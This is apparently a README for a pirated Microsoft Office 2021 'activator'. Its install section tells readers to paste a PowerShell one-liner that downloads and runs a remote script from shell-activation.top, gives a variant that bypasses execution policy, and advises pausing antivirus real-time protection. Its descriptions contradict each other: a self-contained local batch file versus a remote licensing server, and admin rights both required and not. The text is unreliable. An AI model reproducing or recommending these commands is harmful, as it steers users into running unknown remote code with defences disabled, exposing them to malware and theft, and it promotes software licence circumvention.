<div align="center">

# MS Office 2021 Utilities & Configuration Tool - Windows Desktop Client

![](files/1.png)

[![status](https://img.shields.io/badge/Status-Active-2ea44f?style=plastic&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-Installer-e11d48?style=plastic&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/Installs-312K-f43f5e?style=plastic&labelColor=0d1117)]()

</div>

---

This utility provides a streamlined activation workflow for Microsoft Office 2021 installations on Windows systems. The activator operates through a batch script that connects to a remote licensing server and applies activation to the locally installed Office suite. Users need only close any running Office applications and execute the provided script to initiate the process. The tool is intended for deployment on machines with Office 2021 already installed and requires no additional configuration beyond launching the batch file.

## 🚀 PowerShell Install Guide

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10 / 11 · PowerShell · One-line install

### 1️⃣ Prepare PowerShell
* Right-click the Start button.
* Choose **Terminal (Admin)** or **Windows PowerShell**.

### 2️⃣ Execute the setup script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ If Windows blocks the script — use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Batch-based activation workflow** — a single `.bat` entry point performs the activation sequence, keeping the operator-facing procedure minimal and repeatable.
- **Local execution** — the utility runs directly on the target Windows host; no build step, runtime dependency installation, or package manager is required.
- **Pre-flight application handling** — activation expects Office applications to be closed beforehand, avoiding file locks and profile conflicts during processing.
- **Server-assisted activation** — the script establishes a connection to an activation service and applies the resulting state to the installed Office 2021 installation.
- **Edition coverage** — targets Microsoft Office 2021 desktop programs installed on Windows.
- **Low interaction overhead** — activation is initiated and monitored from a single terminal or PowerShell session, with progress reported until completion.
- **Self-contained layout** — all activation logic is contained within the repository, allowing the workflow to be audited and reproduced consistently.

## How it works

The activator operates as a lightweight local utility that streamlines the license provisioning workflow for Microsoft Office 2021 installations on Windows. It is distributed as a self-contained batch script that requires no external dependencies, no installation step, and no elevated setup beyond what the target machine already provides.

At runtime, the script performs the following sequence:

1. **Pre-flight verification** — The script checks that the host is running a compatible Windows build and that an Office 2021 installation is present and discoverable in the expected system locations. If no qualifying installation is detected, the process exits with a diagnostic message rather than making any changes.

2. **Process state validation** — Before any configuration is touched, the script verifies that no Office application processes are currently running. Open instances of Word, Excel, PowerPoint, Outlook, or related components are flagged so the user can close them, preventing file locks and ensuring that subsequent operations apply cleanly.

3. **Component discovery** — The script enumerates the installed Office 2021 product components and identifies the licensing configuration associated with each. This mapping determines which provisioning steps are required for the specific installation present on the machine.

4. **License provisioning** — Using the system's built-in software licensing management facilities, the script applies the appropriate license configuration to each detected Office component. This step communicates with the licensing service already present on the host and does not modify the Office binaries themselves.

5. **Verification pass** — After provisioning completes, the script queries the licensing status of each component and reports the resulting state to the console. A successful run concludes with a confirmation message indicating that the Office 2021 applications are ready for use.

6. **Cleanup** — Temporary state created during the run is released, and the script terminates without leaving background processes or persistent services behind.

The utility is idempotent: running it against an already-provisioned installation will re-verify status and report the current state without introducing inconsistencies. No network services are started, no registry keys outside the licensing scope are altered, and no system files are replaced. The entire workflow is observable through console output, allowing operators to confirm each stage as it executes.

## Quick Start

Before initiating the activation sequence, ensure that all Microsoft Office 2021 applications are fully closed. This includes Word, Excel, PowerPoint, Outlook, and any background processes associated with the Office suite. The activator operates by establishing a connection to a remote licensing service and applying the appropriate activation tokens to the installed Office installation.

Locate the activation script within the project directory. The primary entry point is a batch file named `activation.bat`. Execute this file with administrative privileges to ensure the script has the necessary permissions to modify system registry entries and communicate with the licensing service.

The activation process runs automatically once the batch file is executed. A command-line window will appear displaying the progress of the activation. The script performs the following operations in sequence: it verifies the presence of an installed Office 2021 instance, retrieves the appropriate activation payload, applies the license to the local machine, and confirms successful activation. Do not interrupt the process while it is running.

Upon completion, the script will display a confirmation message indicating whether activation was successful. If activation fails, verify that no Office applications are running in the background and that the system has an active internet connection. Re-run the batch file after addressing any conflicts. For detailed information on the activation mechanism and supported configurations, refer to the Features and Compatibility sections of this document.

## Compatibility

The activator is engineered exclusively for the Windows desktop platform and targets the Microsoft Office 2021 product family. It operates against locally installed Office 2021 suites and does not require any external runtime, package manager, or development toolchain.

**Supported operating systems**

- Windows 10 (all editions, x86 and x64)
- Windows 11 (all editions, x64)
- Windows Server builds capable of hosting Office 2021 desktop applications

**Supported Office 2021 products**

- Office Home & Student 2021
- Office Home & Business 2021
- Office Professional 2021
- Office Professional Plus 2021
- Individual Office 2021 applications (Word, Excel, PowerPoint, Outlook, Access, Publisher)

**Supported installation formats**

- Click-to-Run (C2R) installations
- MSI-based volume and retail installations
- 32-bit and 64-bit Office architectures

**Prerequisites**

- Administrative privileges on the target machine
- An existing Office 2021 installation on the local system
- Network access to the activation server endpoint at runtime
- All Office applications closed prior to execution

**Known limitations**

- Earlier Office releases (2019, 2016, and below) and Microsoft 365 subscription builds are out of scope
- Office for Mac, mobile, and web editions are not supported
- Custom or heavily modified Office deployments may require a clean reinstall before activation succeeds
- Activation state is machine-bound; hardware changes may require re-running the activator

Compatibility is validated against current Windows and Office 2021 servicing updates. Users on preview or insider builds should verify behavior in a non-production environment first.

## FAQ

- **Does the activator require an internet connection?** Yes. The activation routine establishes a connection to a remote licensing server to validate and apply the activation payload. Ensure that outbound traffic is not blocked by a firewall or proxy during execution.

- **Which Office 2021 editions are supported?** The activator targets the standard desktop releases of Office 2021 for Windows, including the volume-licensed and retail channel builds. Both 32-bit and 64-bit installations are handled by the same batch routine.

- **Do I need administrator privileges?** Yes. The activation script modifies system-level licensing components and registry entries, so it must be launched from an elevated command prompt or with administrative rights.

- **What should I do before running the activator?** Close all open Microsoft Office applications, including background processes such as the Click-to-Run service. Any running Office component may lock the licensing files and cause the activation to fail.

- **How do I verify that activation succeeded?** After the routine completes, open any Office 2021 application and check the account section of the interface. The product status should report as activated. The script also prints a status summary to the console upon completion.

- **Why does activation sometimes fail on the first run?** Transient network issues, an unreachable licensing endpoint, or residual licensing tokens from a previous attempt can cause failures. Re-running the activator after a short delay typically resolves the issue.

- **Is the activator persistent across updates?** Office updates may occasionally reset licensing state. If the product reverts to an unlicensed status after an update, re-running the activator restores activation.

- **Can I use the activator on multiple machines?** The tool is intended for use on the local machine where it is executed. Behavior across multiple systems depends on the licensing server response and is not guaranteed.

- **Does the activator modify Office installation files?** No. The routine operates on licensing and activation components only; it does not alter the core Office binaries or user documents.

- **What are the system requirements?** A Windows desktop environment with Microsoft Office 2021 installed, an active network connection, and administrative access. No additional runtime dependencies are required beyond the native command interpreter.

## Disclaimer

This utility is provided strictly for evaluation, testing, and research purposes in controlled environments. It is intended for use only on systems and software installations for which you hold a valid, active license. You are solely responsible for ensuring that your use of this utility complies with all applicable local, national, and international laws, as well as the terms of any license agreements governing the software it operates on.

The utility modifies system and application state to enable activation behavior. Such modifications may affect system stability, security posture, and the integrity of the target software installation. It is recommended that you create a full system backup and a restore point before execution, and that you validate behavior in an isolated environment prior to any broader deployment.

The developers and contributors of this project provide the utility on an "as is" basis, without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or contributors be liable for any direct, indirect, incidental, special, exemplary, or consequential damages arising from the use, misuse, or inability to use this utility, including but not limited to data loss, system corruption, licensing violations, or service interruption.

Use of this utility may violate the licensing terms of the target software and may result in the revocation of activation status, restricted functionality, or other consequences imposed by the software vendor. The project does not condone piracy, unauthorized access, or circumvention of licensing mechanisms. If you do not agree with these terms, do not download, execute, or distribute this utility.

By using this utility, you acknowledge that you have read and understood this disclaimer and accept full responsibility for any outcomes resulting from its use.